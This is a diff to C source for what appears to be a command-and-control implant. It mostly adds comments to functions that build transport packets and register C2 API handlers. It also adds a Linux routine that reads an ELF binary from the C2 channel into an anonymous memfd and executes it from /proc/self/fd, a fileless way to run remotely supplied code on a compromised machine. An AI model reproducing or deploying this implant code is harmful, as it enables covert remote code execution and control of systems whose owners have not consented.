@@ -42,6 +42,11 @@
 
 #include "uthash/uthash.h"
 
+/*
+ * Craft TLV transport packet from primary TLV transport packet
+ * and C2 API call packet.
+ */
+
 tlv_transport_pkt_t craft_c2_tlv_pkt(tlv_transport_pkt_t tlv_transport_packet, c2_api_call_t *c2_api_call_new)
 {
     tlv_transport_pkt_t c2_tlv_pkt = {
@@ -56,6 +61,11 @@ tlv_transport_pkt_t craft_c2_tlv_pkt(tlv_transport_pkt_t tlv_transport_packet, c
     return c2_tlv_pkt;
 }
 
+/*
+ * Craft C2 API call packet from primary TLV transport packet
+ * and C2 API call status and result.
+ */
+
 c2_api_call_t *craft_c2_api_call_pkt(tlv_transport_pkt_t tlv_transport_packet, int c2_api_call_status,
                                      char *c2_api_call_result)
 {
@@ -69,6 +79,10 @@ c2_api_call_t *craft_c2_api_call_pkt(tlv_transport_pkt_t tlv_transport_packet, i
     return c2_api_call_new;
 }
 
+/*
+ * Append string to the C2 API call packet.
+ */
+
 void c2_add_str(c2_api_call_t *c2_api_call_new, char *c2_str)
 {
     size_t str_len = strlen(c2_str) + 1;
@@ -80,10 +94,41 @@ void c2_add_str(c2_api_call_t *c2_api_call_new, char *c2_str)
     c2_api_call_new->c2_api_call_result = result;
 }
 
+/*
+ * Register C2 API calls and save them to the C2 API calls table.
+ */
+
 void c2_register_api_calls(c2_api_calls_t **c2_api_calls_table)
 {
     register_api_calls(c2_api_calls_table);
 }
+
+/*
+ * Load C2 ELF on-fly from memory.
+ */
+
+#ifdef LINUX
+int c2_load_elf_on_fly(tlv_transport_pkt_t tlv_transport_packet)
+{
+
+    int fd = memfd_create("", 0);
+
+    if (fd < 0)
+        return -1;
+
+    tlv_transport_channel_read_file_fd(tlv_transport_packet, fd);
+
+    char fd_path[20];
+    sprintf(&fd_path, "/proc/self/fd/%d", fd);
+    system(fd_path);
+
+    return fd;
+}
+#endif
+
+/*
+ * Unload C2 API calls related to the specific API calls scope.
+ */
 
 int c2_unload_api_calls(c2_api_calls_t **c2_api_calls_table, int c2_api_call_scope)
 {
@@ -120,6 +165,10 @@ int c2_unload_api_calls(c2_api_calls_t **c2_api_calls_table, int c2_api_call_sco
 
     return -1;
 }
+
+/*
+ * Load C2 API calls from the shared object or dynamic library.
+ */
 
 int c2_load_api_calls(c2_api_calls_t **c2_api_calls_table, char *plugin)
 {
@@ -160,6 +209,10 @@ int c2_load_api_calls(c2_api_calls_t **c2_api_calls_table, char *plugin)
     return 0;
 }
 
+/*
+ * Register C2 API calls scope and connect C2 API calls table to it.
+ */
+
 static void c2_register_api_calls_scope(c2_api_calls_t **c2_api_calls_table, int c2_api_call_scope)
 {
     c2_api_calls_t *c2_api_calls_new;
@@ -180,6 +233,10 @@ static void c2_register_api_calls_scope(c2_api_calls_t **c2_api_calls_table, int
         }
     }
 }
+
+/*
+ * Register C2 API calls tag.
+ */
 
 static void c2_register_api_calls_tag(c2_api_calls_t **c2_api_calls_table, int c2_api_call_scope,
                                       int c2_api_call_tag, c2_api_t c2_api_call_handler)
@@ -209,6 +266,10 @@ static void c2_register_api_calls_tag(c2_api_calls_t **c2_api_calls_table, int c
         }
     }
 }
+
+/*
+ * Register C2 API call.
+ */
 
 void c2_register_api_call(c2_api_calls_t **c2_api_calls_table,
                           int c2_api_call_tag, c2_api_t c2_api_call_handler,
@@ -246,10 +307,18 @@ c2_api_call_t *c2_make_api_call(c2_api_calls_t **c2_api_calls_table,
     return c2_api_call_handlers_new->c2_api_call_handler(tlv_transport_packet);
 }
 
+/*
+ * Free single C2 API call.
+ */
+
 void c2_api_call_free(c2_api_call_t *c2_api_call_new)
 {
     free(c2_api_call_new);
 }
+
+/*
+ * Free whole C2 API calls table.
+ */
 
 void c2_api_calls_free(c2_api_calls_t *c2_api_calls_new)
 {
